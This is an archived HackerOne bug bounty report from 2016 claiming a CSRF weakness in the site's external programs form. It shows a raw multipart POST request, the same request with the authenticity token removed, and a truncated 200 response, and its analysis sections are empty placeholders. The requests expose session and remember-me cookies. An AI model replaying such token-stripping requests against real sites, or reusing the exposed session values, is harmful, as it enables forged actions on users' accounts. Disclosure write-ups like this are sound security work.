# Possible CSRF during external programs

## Metadata
- **Source:** HackerOne
- **Report:** 174470 | https://hackerone.com/reports/174470
- **Submitted:** 2016-10-07
- **Reporter:** malcolmx
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

at first i want to say that my report is the same of this report #148517 i see you accept it
as a valid one so i reported this

HackerOne allow users to Made  external programs pages for programs 
the request i test will be (The original Request )

```
POST /external_programs HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
A

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

at first i want to say that my report is the same of this report #148517 i see you accept it
as a valid one so i reported this

HackerOne allow users to Made  external programs pages for programs 
the request i test will be (The original Request )

```
POST /external_programs HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-CSRF-Token: QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/directory/new
Content-Length: 2201
Content-Type: multipart/form-data; boundary=---------------------------69012895419981
Cookie: __cfduid=d392bc78bdc47358777e96f553ba0dfd81465710456; _ga=GA1.2.113987850.1465710458; __Host-remember_me_token=BAhbCFsGaQK6q0kiGWozc3lrNWdYM3NlUjljcDlrVXI4BjoGRVRJIhcxNDc1NjY3NDg0LjA1MDMwMzIGOwBG--86fb937b8501cdfb5d966d667170cd46bc807d06; __Host-session=YXZIM09kM09tQnZJK0QyNnh6N0IxeWYwcTdOcXRtN2FjcHZwMmtHOHhWbmN5djlEUGNQdCtIWDQvRmQ3OEd2Skx2NU5oYkxxVFE3VlhzTG9nUG5xbzJQMnI1OEZyRUtpV2l4ZExxVkc3WXVWUHF5ZWhwbndld0J5T2RVQ3VIdVpEL3JSaWtEd3d1S3VMMGNKZzdib1VMT3FqbHJTOGtwYXArOHZlOHYvODBZeVpWa3doSHRMRUF5RHBYejNkUnFWcFp3TU8yaTJ1ZDZpc0RvSUtKY0tKb1VUSmpmMkRpT09oQjRBeHZXdElGNlFJZ2YwY293eTV2L3FvMnJTK3oxQXoyVzV5WGtlRUlzcEt0MzYwMnZ5QTBoaVIvWlRPS2JVYW1pTFp1RCttS0E2d3gyOTkwT3MyZktGYjgxenhEdVpob0drZVNCWkI3STJ1dDhMUzZXYVFzZUtCeXRMVUZWdXVnWmg1THMzZ1phV3l3NDhtcEtSZ2VuL2Y3MHJ1SzJBam5wVUpMVnJwbzdLUkRoWmFwbnRkZ3VHYXFyNkJBNSsxaUUxZytDUy9vRVgrby9LRUw1R01URFQzSnJIK2hmei0tY2RUVnNpcGFWK2lTTjZqTUt4S2xaQT09--3077fffe1af7167a430e145b831f251b987d701e
Connection: keep-alive

-----------------------------69012895419981
Content-Disposition: form-data; name="authenticity_token"

QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==
-----------------------------69012895419981
Content-Disposition: form-data; name="name"

test
-----------------------------69012895419981
Content-Disposition: form-data; name="handle"

edmodotest
-----------------------------69012895419981
Content-Disposition: form-data; name="about"


-----------------------------69012895419981
Content-Disposition: form-data; name="website"

edmodo.com
-----------------------------69012895419981
Content-Disposition: form-data; name="twitter_handle"


-----------------------------69012895419981
Content-Disposition: form-data; name="policy"

Exclusions

While researching, we'd like to ask you to refrain from:

    Denial of service
    Spamming
    Social engineering (including phishing) of edmodo staff or contractors
    Any physical attempts against edmodo property or data centers

-----------------------------69012895419981
Content-Disposition: form-data; name="policy_url"


-----------------------------69012895419981
Content-Disposition: form-data; name="scopes[]"


-----------------------------69012895419981
Content-Disposition: form-data; name="scopes[]"


-----------------------------69012895419981
Content-Disposition: form-data; name="offers_rewards"

true
-----------------------------69012895419981
Content-Disposition: form-data; name="thanks_url"


-----------------------------69012895419981
Content-Disposition: form-data; name="disclosure_url"


-----------------------------69012895419981
Content-Disposition: form-data; name="disclosure_method"

email
-----------------------------69012895419981
Content-Disposition: form-data; name="disclosure_email"

policy@edmodo.com
-----------------------------69012895419981
Content-Disposition: form-data; name="profile_picture"; filename=""
Content-Type: application/octet-stream


-----------------------------69012895419981
Content-Disposition: form-data; name="_ignore"


-----------------------------69012895419981--

```

{F126498}

- i removed one token from the request and the (Edited Request was)

```
POST /external_programs HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-CSRF-Token: QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/directory/new
Content-Length: 2007
Content-Type: multipart/form-data; boundary=---------------------------69012895419981
Cookie: __cfduid=d392bc78bdc47358777e96f553ba0dfd81465710456; _ga=GA1.2.113987850.1465710458; __Host-remember_me_token=BAhbCFsGaQK6q0kiGWozc3lrNWdYM3NlUjljcDlrVXI4BjoGRVRJIhcxNDc1NjY3NDg0LjA1MDMwMzIGOwBG--86fb937b8501cdfb5d966d667170cd46bc807d06; __Host-session=YXZIM09kM09tQnZJK0QyNnh6N0IxeWYwcTdOcXRtN2FjcHZwMmtHOHhWbmN5djlEUGNQdCtIWDQvRmQ3OEd2Skx2NU5oYkxxVFE3VlhzTG9nUG5xbzJQMnI1OEZyRUtpV2l4ZExxVkc3WXVWUHF5ZWhwbndld0J5T2RVQ3VIdVpEL3JSaWtEd3d1S3VMMGNKZzdib1VMT3FqbHJTOGtwYXArOHZlOHYvODBZeVpWa3doSHRMRUF5RHBYejNkUnFWcFp3TU8yaTJ1ZDZpc0RvSUtKY0tKb1VUSmpmMkRpT09oQjRBeHZXdElGNlFJZ2YwY293eTV2L3FvMnJTK3oxQXoyVzV5WGtlRUlzcEt0MzYwMnZ5QTBoaVIvWlRPS2JVYW1pTFp1RCttS0E2d3gyOTkwT3MyZktGYjgxenhEdVpob0drZVNCWkI3STJ1dDhMUzZXYVFzZUtCeXRMVUZWdXVnWmg1THMzZ1phV3l3NDhtcEtSZ2VuL2Y3MHJ1SzJBam5wVUpMVnJwbzdLUkRoWmFwbnRkZ3VHYXFyNkJBNSsxaUUxZytDUy9vRVgrby9LRUw1R01URFQzSnJIK2hmei0tY2RUVnNpcGFWK2lTTjZqTUt4S2xaQT09--3077fffe1af7167a430e145b831f251b987d701e
Connection: keep-alive


-----------------------------69012895419981
Content-Disposition: form-data; name="name"

test
-----------------------------69012895419981
Content-Disposition: form-data; name="handle"

edmodotest
-----------------------------69012895419981
Content-Disposition: form-data; name="about"


-----------------------------69012895419981
Content-Disposition: form-data; name="website"

edmodo.com
-----------------------------69012895419981
Content-Disposition: form-data; name="twitter_handle"


-----------------------------69012895419981
Content-Disposition: form-data; name="policy"

Exclusions

While researching, we'd like to ask you to refrain from:

    Denial of service
    Spamming
    Social engineering (including phishing) of edmodo staff or contractors
    Any physical attempts against edmodo property or data centers

-----------------------------69012895419981
Content-Disposition: form-data; name="policy_url"


-----------------------------69012895419981
Content-Disposition: form-data; name="scopes[]"


-----------------------------69012895419981
Content-Disposition: form-data; name="scopes[]"


-----------------------------69012895419981
Content-Disposition: form-data; name="offers_rewards"

true
-----------------------------69012895419981
Content-Disposition: form-data; name="thanks_url"


-----------------------------69012895419981
Content-Disposition: form-data; name="disclosure_url"


-----------------------------69012895419981
Content-Disposition: form-data; name="disclosure_method"

email
-----------------------------69012895419981
Content-Disposition: form-data; name="disclosure_email"

policy@edmodo.com
-----------------------------69012895419981
Content-Disposition: form-data; name="profile_picture"; filename=""
Content-Type: application/octet-stream


-----------------------------69012895419981
Content-Disposition: form-data; name="_ignore"


-----------------------------69012895419981--

```

{F126497}
- The Response was

```
HTTP/1.1 200 OK
Date: Fri, 07 Oct 2016 09:11:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 23
Connection: keep-alive
Cache-Control: private, no-cache, no-store, must-revalidate
Cf-Railgun: direct (waiting for pending WAN connection)
Content-Disposition: inline; filename="response."
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src www.youtube-nocookie.com a4l.hackerone-ext-content.com a5s.hackerone-ext-content.com b5s.hackerone-ext-content.com; connect-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-

</details>

---
*Analysed by Claude on 2026-05-24*
